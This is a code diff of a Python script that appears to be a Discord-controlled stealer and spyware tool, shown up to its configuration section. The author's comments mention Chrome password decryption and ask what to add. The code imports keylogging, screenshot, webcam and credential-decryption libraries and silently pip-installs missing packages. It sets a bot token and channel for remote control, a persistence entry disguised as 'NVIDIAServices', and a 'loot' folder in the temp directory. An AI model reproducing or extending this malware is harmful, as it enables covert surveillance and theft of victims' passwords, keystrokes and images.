@@ -1,34 +1,50 @@
-import sys, subprocess, importlib
+# UPDATES COMING SOON!
+# Should work on all platforms, however some functions will not be compatible
+# Most features work except the chrome password decryption isn't updated
+# Let me know what i should add!
+
+import sys, subprocess, importlib, os, platform
 
 REQUIRED = {
     "pystray": "pystray",
     "PIL": "Pillow",
-    "tkinter": None,
     "discord": "discord.py",
     "psutil": "psutil",
     "pyautogui": "pyautogui",
     "pynput": "pynput",
     "Crypto": "pycryptodome",
     "cv2": "opencv-python",
-    "win32crypt": "pywin32",
     "requests": "requests",
+
+    # Windows-only
+    "win32crypt": "pywin32",
+    "winreg": None,   # built-in on Windows, no pip package
 }
 
-def ensure_deps():
-    missing = []
-    for mod, pkg in REQUIRED.items():
-        if pkg and not is_module_available(mod):
-            missing.append(pkg)
-    if missing:
-        print(f"[+] Installing missing packages: {missing}")
-        subprocess.check_call([sys.executable, "-m", "pip", "install", *missing])
-
-def is_module_available(name):
+def is_module_available(name: str) -> bool:
+    """Check if a module can be imported."""
     try:
         importlib.import_module(name)
         return True
     except ImportError:
         return False
+
+def ensure_deps():
+    """Install only missing deps, skip OS-incompatible ones."""
+    system = platform.system()
+    missing = []
+
+    for mod, pkg in REQUIRED.items():
+        # Skip Windows-only modules if not on Windows
+        if system != "Windows" and mod in ("win32crypt", "winreg"):
+            continue
+
+        if pkg and not is_module_available(mod):
+            missing.append(pkg)
+
+    if missing:
+        print(f"[+] Installing missing packages: {missing}")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", *missing])
 
 # Run before any imports
 ensure_deps()
@@ -39,8 +55,6 @@ import threading
 import time
 import pystray
 from PIL import Image
-import os
-import sys
 
 # Suppress discord warnings
 warnings.filterwarnings("ignore", category=UserWarning, module="discord")
@@ -48,92 +62,39 @@ warnings.filterwarnings("ignore", category=UserWarning, module="discord")
 # Configure logging
 logging.basicConfig(level=logging.WARNING)
 
-# List
-discord_loggers = [
-    "discord",
-    "discord.gateway",
-    "discord.client",
-    "discord.http",
-]
-
-for logger in discord_loggers:
+# Discord loggers
+for logger in ["discord", "discord.gateway", "discord.client", "discord.http"]:
     logging.getLogger(logger).setLevel(logging.WARNING)
 
-import tkinter as tk
-from tkinter import messagebox
-import ctypes
-from ctypes import wintypes
-import random
-import discord
-import io
-import json
-import requests
-import socket
+import asyncio, base64, ctypes, datetime, getpass, io, json, pathlib, random, re, shutil, socket, sqlite3, tempfile, urllib.request, zipfile
 from pathlib import Path
-import platform
-import pathlib
-import getpass
-import subprocess
-import re
-import psutil
-import sqlite3
-import shutil
-import datetime
-import pyautogui
-from pynput import keyboard
-import asyncio
-import base64
-import win32crypt
-from Crypto.Cipher import AES
-import zipfile
-import winreg
 from datetime import datetime
-import tempfile
-import cv2
-import base64
-import urllib.request
-import io
+import cv2, discord, psutil, pyautogui, requests
+from Crypto.Cipher import AES
+from pynput import keyboard
 
-# i will add all the imports dynamically soon...
+# Windows-only imports
+if platform.system() == "Windows":
+    import win32crypt, winreg
+    from ctypes import wintypes
 
 # === Global Variables ===
 tray_icon = None
-gui_open = False
-root = None  # GUI root window
-
-
-# === Theme Presets ===
-LIGHT_THEME = {
-    "bg": "#f0f0f0",
-    "fg": "#111111",
-    "entry_bg": "#ffffff",
-    "button_bg": "#e0e0e0",
-    "accent": "#4caf50",
-    "highlight": "#cccccc",
-}
-
-DARK_THEME = {
-    "bg": "#1e1e1e",
-    "fg": "#f0f0f0",
-    "entry_bg": "#2e2e2e",
-    "button_bg": "#3a3a3a",
-    "accent": "#4caf50",
-    "highlight": "#444444",
-}
 
 # Configuration
 BOT_TOKEN = ""  # add your discord bot token here
-BOT_CHANNEL_ID =  # add the discord channel ID here
-PERSISTENCE_NAME = "NVIDIAServices"  # this is the name that will show up in startup folder
+BOT_CHANNEL_ID = None  # replace with actual channel ID (int) when ready
+PERSISTENCE_NAME = "NVIDIAServices"
 LOOT_DIR = os.path.join(tempfile.gettempdir(), "NVIDIA_Services_Data")
 try:
     os.makedirs(LOOT_DIR, exist_ok=True)
 except PermissionError:
-    # Try an alternative location if the first fails
     LOOT_DIR = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp", "NVIDIA_Services_Data")
     os.makedirs(LOOT_DIR, exist_ok=True)
 
 # ===== System Tray Functions =====
+
+# tray icon image (PNG to base64)
 
 ICON_BASE64 = "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"  # full base64 string
 
